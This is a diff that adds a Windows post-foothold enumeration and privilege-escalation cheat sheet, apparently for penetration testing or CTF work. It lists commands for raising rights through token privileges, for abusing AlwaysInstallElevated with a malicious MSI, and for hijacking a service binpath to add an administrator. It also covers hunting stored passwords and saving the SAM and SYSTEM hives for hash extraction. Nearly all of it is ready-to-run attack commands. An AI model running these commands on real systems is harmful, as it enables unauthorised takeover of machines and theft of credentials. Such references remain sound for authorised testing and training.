@@ -1,0 +1,80 @@
+WINDOWS LOCAL ENUMERATION - QUICK REF
+Post-foothold on a Windows machine. No AD/domain tools. Replace <...> with your own values.
+
+── AUTOMATED TOOLS (run first) ──────────────────────────────────────────────────────────────────
+winpeas.exe                                                      comprehensive automated scan
+winpeas.exe quiet                                                less output, faster
+Seatbelt.exe -group=all                                          targeted security checks
+Invoke-PrivescCheck -Extended                                    PowerShell, no binary needed
+
+── SYSTEM INFORMATION ───────────────────────────────────────────────────────────────────────────
+systeminfo                                                       OS, version, hotfixes, arch
+hostname && whoami
+echo %OS% %PROCESSOR_ARCHITECTURE%
+
+── USERS & GROUPS ───────────────────────────────────────────────────────────────────────────────
+whoami /all                                                      user + groups + privs in one shot
+whoami /priv                                                     token privileges → privesc
+net user                                                         list local users
+net user <username>                                              details on specific user
+net localgroup administrators                                    who is local admin?
+query user                                                       currently logged-in users
+Get-LocalUser                                                    PowerShell equivalent
+Get-LocalGroupMember -Group "Administrators"
+
+── TOKEN PRIVILEGES (whoami /priv) ──────────────────────────────────────────────────────────────
+SeImpersonatePrivilege     → PrintSpoofer / GodPotato / JuicyPotato → SYSTEM
+SeBackupPrivilege          → read any file (SAM, SYSTEM, NTDS.dit)
+SeDebugPrivilege           → dump lsass → hashes
+SeLoadDriverPrivilege      → malicious driver → kernel privesc
+
+── NETWORK ──────────────────────────────────────────────────────────────────────────────────────
+ipconfig /all                                                    interfaces, IPs, DNS, DHCP
+netstat -ano                                                     open ports + PID
+route print                                                      routing table
+arp -a                                                           ARP cache — other hosts
+netsh advfirewall show allprofiles                               firewall status
+
+── PROCESSES & SERVICES ─────────────────────────────────────────────────────────────────────────
+tasklist /v /svc                                                 processes + owners + services
+wmic process get name,processid,commandline
+sc query state= all                                              all services
+sc qc <service>                                                  service config (check binpath!)
+wmic service get name,startmode,pathname,state
+
+── INSTALLED SOFTWARE ───────────────────────────────────────────────────────────────────────────
+wmic product get name,version
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s
+
+── SCHEDULED TASKS ──────────────────────────────────────────────────────────────────────────────
+schtasks /query /fo LIST /v                                      all tasks verbose
+Get-ScheduledTask | Where-Object {$_.Principal.UserId -eq "SYSTEM"}
+
+═════════════════════════════════════════════════════════════════════════════════════════════════
+PRIVESC CHECKS
+
+── ALWAYSINSTALLELEVATED ────────────────────────────────────────────────────────────────────────
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+→ both = 0x1: msfvenom -f msi ... → msiexec /quiet /qn /i evil.msi
+
+── UNQUOTED SERVICE PATHS ───────────────────────────────────────────────────────────────────────
+wmic service get name,pathname,startmode | findstr /i "auto" | findstr /iv "c:\windows\\"
+Get-WmiObject Win32_Service | Where-Object {$_.PathName -notmatch '"' -and $_.PathName -match ' '}
+
+── WEAK SERVICE PERMISSIONS ─────────────────────────────────────────────────────────────────────
+accesschk.exe -uwcqv * /accepteula                               services your user can modify
+sc config <service> binpath= "cmd /c net localgroup administrators <user> /add"
+
+── AUTORUNS ─────────────────────────────────────────────────────────────────────────────────────
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+
+── INTERESTING FILES & CREDS ────────────────────────────────────────────────────────────────────
+type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+findstr /si password *.txt *.ini *.xml *.config *.bat *.ps1
+cmdkey /list                                                     saved Windows credentials
+reg save HKLM\SAM C:\Temp\SAM && reg save HKLM\SYSTEM C:\Temp\SYSTEM   → dump locally
+dir /s /b C:\*unattend*.xml C:\*sysprep*.xml                    plaintext passwords
+
+Key:  whoami /priv first → winpeas → systeminfo CVE lookup → PS history + findstr
